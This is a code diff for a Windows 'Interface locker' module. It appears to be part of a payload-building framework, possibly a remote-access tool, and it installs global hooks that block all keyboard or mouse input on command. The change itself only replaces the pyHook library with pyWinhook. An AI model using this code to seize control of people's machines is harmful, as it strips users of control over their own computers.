@@ -5,7 +5,7 @@ config.main()
 
 def main(option):
     if option == 'generate':
-        config.import_statements.append('import pyHook')
+        config.import_statements.append('import pyWinhook')
         config.import_statements.append('import pythoncom')
         config.import_statements.append('import threading')
         config.global_objs.append('keylock = False')
@@ -20,12 +20,12 @@ def enable(event):
 
 
 def key_lock():
-    hm = pyHook.HookManager()
+    hm = pyWinhook.HookManager()
     hm.KeyAll = disable
     hm.HookKeyboard()
     while True:
         if not keylock:
-            hm = pyHook.HookManager()
+            hm = pyWinhook.HookManager()
             hm.KeyAll = enable
             hm.HookKeyboard()
             return
@@ -33,12 +33,12 @@ def key_lock():
 
 
 def mouse_lock():
-    hm = pyHook.HookManager()
+    hm = pyWinhook.HookManager()
     hm.MouseAll = disable
     hm.HookMouse()
     while True:
         if not mouselock:
-            hm = pyHook.HookManager()
+            hm = pyWinhook.HookManager()
             hm.MouseAll = enable
             hm.HookMouse()
             return
@@ -78,6 +78,6 @@ def interface_locker(data):
     elif option == 'info':
         print('\nName             : Interface locker' \
               '\nOS               : Windows' \
-              '\nRequired Modules : PyHook (External), pythoncom (External), threading' \
+              '\nRequired Modules : pyWinhook (External), pythoncom (External), threading' \
               '\nCommands         : lock <key/mouse>, unlock <key/mouse> ' \
               '\nDescription      : Disable or enable the keyboard or mouse interface\n')
